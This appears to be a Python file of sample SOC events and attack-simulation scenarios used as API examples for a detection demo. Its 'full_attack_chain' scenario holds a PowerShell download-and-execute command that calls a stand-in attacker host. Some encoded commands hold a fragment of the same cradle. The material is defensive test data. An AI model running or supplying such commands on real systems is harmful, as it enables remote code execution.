"""OpenAPI / Swagger request examples for SOC demo workflows."""

EVENT_INGEST_EXAMPLES = {
    "powershell_execution": {
        "summary": "Suspicious PowerShell (T1059.001)",
        "description": "Simulates encoded PowerShell execution detected by endpoint agent.",
        "value": {
            "source": "windows-agent",
            "event_type": "process",
            "severity": "high",
            "raw_event": {
                "timestamp": 1719751200,
                "event_id": 4688,
                "process": "powershell.exe",
                "command_line": "powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbAByAGkAZQBuAHQAKQA="
            },
            "normalized_event": {
                "process": "powershell.exe",
                "command": "powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQBwAC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbAByAGkAZQBuAHQAKQA="
            }
        },
    },
    "brute_force_login": {
        "summary": "Brute Force Login (T1110)",
        "description": "Multiple failed login attempts from external IP.",
        "value": {
            "source": "linux-agent",
            "event_type": "login",
            "severity": "high",
            "raw_event": {
                "timestamp": 1719751300,
                "user": "admin",
                "source_ip": "203.0.113.200",
                "status": "failed",
                "attempts": 12
            },
            "normalized_event": {
                "user": "admin",
                "source_ip": "203.0.113.200",
                "status": "failed",
                "attempts": 12
            }
        },
    },
    "network_c2": {
        "summary": "C2 Communication (T1071)",
        "description": "Outbound connection to suspicious external IP.",
        "value": {
            "source": "firewall",
            "event_type": "network",
            "severity": "medium",
            "raw_event": {
                "timestamp": 1719751400,
                "source_ip": "10.0.1.55",
                "destination_ip": "198.51.100.25",
                "destination_port": 443,
                "protocol": "tcp",
                "bytes_sent": 4096
            },
            "normalized_event": {
                "source_ip": "10.0.1.55",
                "destination_ip": "198.51.100.25",
                "destination_port": 443
            }
        },
    },
    "new_user_creation": {
        "summary": "New User Account (T1136)",
        "description": "Unauthorized local user account creation.",
        "value": {
            "source": "windows-agent",
            "event_type": "user_creation",
            "severity": "medium",
            "raw_event": {
                "timestamp": 1719751500,
                "username": "backdoor_svc",
                "created_by": "SYSTEM",
                "domain": "WORKGROUP"
            },
            "normalized_event": {
                "username": "backdoor_svc",
                "created_by": "SYSTEM"
            }
        },
    },
}

ALERT_CREATE_EXAMPLES = {
    "account_takeover": {
        "summary": "Account Takeover - Brute Force + Success",
        "description": "Failed logins followed by successful authentication from same IP.",
        "value": {
            "source": "firewall",
            "raw_data": {
                "source": "firewall",
                "event_type": "login_failed",
                "user": "admin",
                "ip": "203.0.113.200",
                "timestamp": "2026-06-25T10:00:00",
                "severity": "high",
                "activity_name": "Failed Login",
                "class_name": "Authentication"
            }
        },
    },
    "malware_detection": {
        "summary": "Malware Execution (T1204)",
        "description": "Antivirus alert for suspicious file execution.",
        "value": {
            "source": "antivirus",
            "raw_data": {
                "source": "antivirus",
                "event_type": "malware",
                "file_hash": "d41d8cd98f00b204e9800998ecf8427e",
                "file_path": "C:\\Users\\Public\\update.exe",
                "hostname": "WORKSTATION-01",
                "ip": "10.0.1.55",
                "timestamp": "2026-06-25T11:30:00",
                "severity": "critical",
                "activity_name": "Malware Detected",
                "class_name": "Malware Finding"
            }
        },
    },
    "lateral_movement": {
        "summary": "Lateral Movement via RDP (T1021)",
        "description": "RDP session from compromised host to domain controller.",
        "value": {
            "source": "edr",
            "raw_data": {
                "source": "edr",
                "event_type": "remote_access",
                "user": "svc_backup",
                "source_ip": "10.0.1.55",
                "destination_ip": "10.0.0.10",
                "protocol": "rdp",
                "timestamp": "2026-06-25T14:00:00",
                "severity": "high",
                "activity_name": "Remote Desktop Login",
                "class_name": "Network Activity"
            }
        },
    },
}

INCIDENT_ANALYZE_EXAMPLES = {
    "analyze": {
        "summary": "Generate AI Analysis",
        "description": "Triggers OpenAI-powered analysis for an existing incident. No request body required.",
        "value": {},
    },
}

# Pre-built SOC attack simulation scenarios (used by /events/simulate)
SOC_SIMULATION_SCENARIOS = {
    "powershell_attack": {
        "name": "PowerShell Attack Chain",
        "description": "Encoded PowerShell execution triggering T1059.001 detection rule.",
        "events": [
            {
                "source": "windows-agent",
                "event_type": "process",
                "severity": "high",
                "raw_event": {
                    "timestamp": 1719751200,
                    "process": "powershell.exe",
                    "command_line": "powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQBwAC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbAByAGkAZQBuAHQAKQA="
                },
                "normalized_event": {
                    "process": "powershell.exe",
                    "command": "powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQBwAC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbAByAGkAZQBuAHQAKQA="
                },
            }
        ],
    },
    "brute_force_attack": {
        "name": "Brute Force Account Takeover",
        "description": "Failed login attempts from known-malicious IP triggering T1110.",
        "events": [
            {
                "source": "linux-agent",
                "event_type": "login",
                "severity": "high",
                "raw_event": {
                    "timestamp": 1719751300,
                    "user": "admin",
                    "source_ip": "203.0.113.200",
                    "status": "failed",
                    "attempts": 15
                },
                "normalized_event": {
                    "user": "admin",
                    "source_ip": "203.0.113.200",
                    "status": "failed",
                    "attempts": 15
                },
            }
        ],
    },
    "c2_beacon": {
        "name": "C2 Beacon Communication",
        "description": "Outbound connection to known-malicious IP triggering T1071.",
        "events": [
            {
                "source": "firewall",
                "event_type": "network",
                "severity": "medium",
                "raw_event": {
                    "timestamp": 1719751400,
                    "source_ip": "10.0.1.55",
                    "destination_ip": "198.51.100.25",
                    "destination_port": 443,
                    "protocol": "tcp"
                },
                "normalized_event": {
                    "source_ip": "10.0.1.55",
                    "destination_ip": "198.51.100.25"
                },
            }
        ],
    },
    "full_attack_chain": {
        "name": "Full Attack Chain Demo",
        "description": "PowerShell → C2 → brute force — complete SOC workflow demo.",
        "events": [
            {
                "source": "windows-agent",
                "event_type": "process",
                "severity": "high",
                "raw_event": {
                    "timestamp": 1719751200,
                    "process": "powershell.exe",
                    "command_line": "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
                },
                "normalized_event": {
                    "process": "powershell.exe",
                    "command": "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
                },
            },
            {
                "source": "firewall",
                "event_type": "network",
                "severity": "medium",
                "raw_event": {
                    "timestamp": 1719751250,
                    "source_ip": "10.0.1.55",
                    "destination_ip": "198.51.100.25",
                    "destination_port": 443
                },
                "normalized_event": {
                    "source_ip": "10.0.1.55",
                    "destination_ip": "198.51.100.25"
                },
            },
            {
                "source": "linux-agent",
                "event_type": "login",
                "severity": "high",
                "raw_event": {
                    "timestamp": 1719751300,
                    "user": "admin",
                    "source_ip": "203.0.113.200",
                    "status": "failed",
                    "attempts": 8
                },
                "normalized_event": {
                    "user": "admin",
                    "source_ip": "203.0.113.200",
                    "status": "failed",
                    "attempts": 8
                },
            },
        ],
    },
}
